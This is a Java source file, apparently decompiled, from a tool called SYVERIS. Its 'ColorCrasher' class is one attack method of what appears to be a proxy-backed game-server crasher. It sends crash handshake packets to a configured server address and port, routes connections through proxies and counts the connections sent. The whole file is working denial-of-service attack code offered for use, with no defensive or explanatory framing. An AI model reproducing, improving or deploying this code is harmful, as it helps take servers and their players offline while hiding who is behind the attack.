package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.PacketUtils;
import IO.SYVERIS.utils.ProxyLoader;
import IO.SYVERIS.utils.RandomUtils;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.awt.Color;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Random;
import java.util.zip.Deflater;

public class ColorCrasher implements Method {
   private Handshake handshake;
   private byte[] bytes;

   public ColorCrasher() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public static byte[] createoverflowPacket() throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      PacketUtils.writeVarInt(out, 0);
      Random randomGenerator = new Random();
      int red = randomGenerator.nextInt(256);
      int green = randomGenerator.nextInt(256);
      int blue = randomGenerator.nextInt(256);
      Color randomColour = new Color(red, green, blue);
      PacketUtils.writeString(out, randomColour + RandomUtils.randomString(4));
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

      try {
         writePacket(PacketUtils.createHandshakePacketCrash(Main.srvRecord, Main.port, 47), bbbb);
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      channel.writeAndFlush(bbbb);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }

   public byte[] compress(byte[] packet, int threshold) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      byte[] buffer = new byte[8192];
      if (packet.length >= threshold && threshold > 0) {
         byte[] data = new byte[packet.length];
         System.arraycopy(packet, 0, data, 0, packet.length);
         PacketUtils.writeVarInt(out, data.length);
         Deflater def = new Deflater();
         def.setInput(data, 0, data.length);
         def.finish();

         while(!def.finished()) {
            int i = def.deflate(buffer);
            out.write(buffer, 0, i);
         }

         def.reset();
      } else {
         PacketUtils.writeVarInt(out, 0);
         out.write(packet);
      }

      out.close();
      return bytes.toByteArray();
   }

   public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
      writeVarInt(packetData.length, out);
      out.write(packetData);
   }

   public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
      while((value & -128) != 0) {
         out.writeByte(value & 127 | 128);
         value >>>= 7;
      }

      out.writeByte(value);
   }
}
